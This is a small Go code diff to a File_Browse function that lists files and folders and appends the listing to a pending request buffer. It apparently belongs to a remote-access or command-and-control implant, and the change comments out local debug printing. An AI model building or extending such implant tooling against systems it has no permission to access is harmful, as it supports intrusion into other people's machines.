@@ -155,10 +155,6 @@ func File_Browse(b []byte) []byte {
 	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
 	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")
 
-	if err != nil {
-		panic(err)
-	}
-
 	// build string for result
 	/*
 	   /Users/xxxx/Desktop/dev/deacon/*
@@ -208,7 +204,7 @@ func File_Browse(b []byte) []byte {
 			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
 		}
 	}
-	fmt.Println(resultStr)
+	//fmt.Println(resultStr)
 
 	return util.BytesCombine(pendingRequest, []byte(resultStr))
 
